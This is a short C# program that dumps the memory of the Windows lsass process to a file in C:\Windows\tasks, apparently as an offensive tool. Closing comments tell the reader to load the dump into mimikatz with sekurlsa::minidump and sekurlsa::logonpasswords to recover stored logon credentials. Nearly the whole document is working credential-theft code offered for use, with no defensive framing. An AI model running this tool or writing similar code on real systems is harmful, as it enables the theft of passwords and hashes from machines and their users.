using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace lsass-manual-dump
{
    //minidump for lsass

    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,
 IntPtr hFile, int DumpType, IntPtr ExceptionParam,
 IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
 int processId);




        static void Main(string[] args)
        {
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
            bool dumped = MiniDumpWriteDump(handle, lsass_pid,
           dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero,
           IntPtr.Zero);


        }
    }
}
//this script is in case you want to take the lsass dump offline to find secrets
//afterthis you can just fire mimikatz , sekurlsa::minidump lsass.dmp ,,sekurlsa::logonpasswords
